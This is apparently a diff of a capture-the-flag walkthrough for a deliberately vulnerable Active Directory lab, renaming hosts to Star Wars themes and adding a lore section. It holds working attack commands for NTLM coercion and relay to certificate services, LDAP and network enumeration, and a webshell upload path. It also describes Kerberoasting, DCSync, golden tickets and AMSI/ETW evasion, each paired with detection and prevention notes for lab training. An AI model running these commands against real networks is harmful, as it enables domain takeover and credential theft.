 impacket-printerbug -no-pass '@10.10.0.10' 10.10.0.1
 ```
@@ -758,7 +758,7 @@ impacket-printerbug -no-pass '@10.10.0.10' 10.10.0.1
 ```bash
 # Coerce → relay to ADCS over HTTP:
 impacket-ntlmrelayx -t http://10.10.0.12/CertSrv/certfnsh.asp --adcs --template DomainController -smb2support &
-impacket-petitpotam -u '' -p '' -d corp.local 10.10.0.1@80/test 10.10.0.10
+impacket-petitpotam -u '' -p '' -d empire.local 10.10.0.1@80/test 10.10.0.10
 ```
 **Detection:** WebClient service start events; outbound HTTP from server to non-CA IP with NTLM auth.
 **Prevention:** Set WebClient to manual/disabled on servers.
@@ -770,9 +770,9 @@ impacket-petitpotam -u '' -p '' -d corp.local 10.10.0.1@80/test 10.10.0.10
 `ADWS` service auto-start is enforced on every DC. ADWS is the transport behind `Get-ADUser` etc. — useful when LDAP/389 is blocked but 9389 isn't.
 
 ```bash
-nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --use-kcache  # falls back to ADWS
+nxc ldap 10.10.0.10 -u peter.parker -p 'EmpireLab2024!' --use-kcache  # falls back to ADWS
 # Or directly via SOAPHound / PowerShell ActiveDirectory module:
-Get-ADUser -Server dc01.eu.corp.local:9389 -Filter *
+Get-ADUser -Server deathstar.eu.empire.local:9389 -Filter *
 ```
 **Detection:** Unusual 9389 source IPs in DC firewall logs.
 **Prevention:** Restrict ADWS to mgmt subnets via firewall.
@@ -784,9 +784,9 @@ Get-ADUser -Server dc01.eu.corp.local:9389 -Filter *
 `FDResPub`, `SSDPSRV`, `fdPHost` are running everywhere. WS-Discovery (`urn:schemas-xmlsoap-org:ws:2005:04:discovery`) sends multicast probes — passive listening on the bridge reveals hostnames + roles.
 
 ```bash
-sudo tcpdump -i dvad-ctf -n 'host 239.255.255.250 or port 1900 or port 3702'
+sudo tcpdump -i empire-ctf -n 'host 239.255.255.250 or port 1900 or port 3702'
 nmap --script broadcast-wsdd-discover
-gobuster dns -d corp.local -w /usr/share/wordlists/dnssrv.txt
+gobuster dns -d empire.local -w /usr/share/wordlists/dnssrv.txt
 ```
 **Detection:** Network monitoring for excessive WS-Discovery; passive IDS.
 **Prevention:** Disable WS-Discovery services where not needed.
@@ -795,7 +795,7 @@ gobuster dns -d corp.local -w /usr/share/wordlists/dnssrv.txt
 
 ### IA-048 — SQL Server Browser (UDP 1434) broadcast discovery
 
-SQLBrowser auto-start on sql01 exposes instance metadata to unauthenticated UDP probes.
+SQLBrowser auto-start on kamino exposes instance metadata to unauthenticated UDP probes.
 
 ```bash
 nmap -sU -p1434 --script ms-sql-info,broadcast-ms-sql-discover 10.10.0.14
@@ -807,7 +807,7 @@ Chains into IA-011 (sa weak password) once you know the instance.
 
 ---
 
-### IA-049 — IIS WebDAV writable upload → ASPX webshell (ca01)
+### IA-049 — IIS WebDAV writable upload → ASPX webshell (endor)
 
 If WebDAV is misconfigured to allow PUT on a `.aspx` extension (lab leaves the defaults), you go from unauth PROPFIND to RCE under `IIS APPPOOL\DefaultAppPool`.
 
@@ -858,15 +858,15 @@ You are on Kali at 10.10.0.1 with no creds.
 │       IA-025 VPN/SSL-VPN CVE
 │       IA-026 web app / Log4Shell
 │       IA-034 SNMP public/private read+write
-│       IA-035 anon FTP on file01
-│       IA-036 Telnet brute on file01
-│       IA-037 anon NFS rw on file01
-│       IA-038 SMB1 / EternalBlue on file01
-│       IA-039 IIS WebDAV PROPFIND/relay on ca01
+│       IA-035 anon FTP on scarif
+│       IA-036 Telnet brute on scarif
+│       IA-037 anon NFS rw on scarif
+│       IA-038 SMB1 / EternalBlue on scarif
+│       IA-039 IIS WebDAV PROPFIND/relay on endor
 │       IA-040 WinRM HTTPS (5986) self-signed
 │       IA-041 DNS AXFR on every DC
 │       IA-042 null-session pipes on every DC
-│       IA-043 RDP NLA-off on ws01
+│       IA-043 RDP NLA-off on tatooine
 │       IA-044 PrinterBug from any member
 │       IA-045 WebClient HTTP coercion path
 │       IA-046 ADWS (9389) enum
@@ -902,8 +902,90 @@ The original docs assumed you were `corp\peter.parker` with a password — they 
 - IA-006 / IA-007 → you have a password → [`02-recon.md`](02-recon.md)
 - IA-013 → you have DC$ cert / TGT → [`07-forest-compromise.md`](07-forest-compromise.md) (DF-011 ESC8 chain)
 - IA-009 / IA-008 relay → you have RBCD / Domain User → [`03-credential-access.md`](03-credential-access.md)
-- IA-019..028 → you have a code-exec on `ws01` → [`05-privilege-escalation.md`](05-privilege-escalation.md) (PE family)
+- IA-019..028 → you have a code-exec on `tatooine` → [`05-privilege-escalation.md`](05-privilege-escalation.md) (PE family)
 
 ---
 
 Next: [`03-credential-access.md`](03-credential-access.md).
+
+---
+
+# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping
+
+Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.
+
+## The Galactic Topology
+
+The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.
+
+```mermaid
+graph TD
+    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
+    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
+    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
+    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;
+
+    subgraph The Galactic Empire (empire.local)
+        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
+        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
+        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
+        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
+        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
+        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
+        Coruscant -- "Imperial Command" --> DeathStar
+        Coruscant --- Scarif
+        Coruscant --- Kamino
+        Coruscant --- Endor
+        Coruscant --- Mandalore
+    end
+
+    subgraph The Rebel Alliance (rebel.local)
+        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
+    end
+
+    subgraph The Trade Federation (trade.corp)
+        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
+    end
+
+    Coruscant <-->|Espionage / External Trust| Yavin4
+    Coruscant <-->|Treaty / Forest Trust| Neimoidia
+```
+
+## Infrastructure Mapping
+
+Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:
+
+### 1. The Core Domains
+* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
+* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
+* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
+* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.
+
+### 2. High-Value Targets (Servers)
+* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
+* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
+* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
+* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
+* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.
+
+### 3. Attack Paths and Tactics
+* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
+* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
+* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
+* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
+* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.
+
+## The Hacker's Code (Sith vs Jedi)
+As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?
+
+* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
+* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).
+
+## Flag Locations (Holocrons)
+Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 
+
+**Remember:** 
+* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
+* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.
+
+May the Force be with you as you conquer the EMPIRE AD!
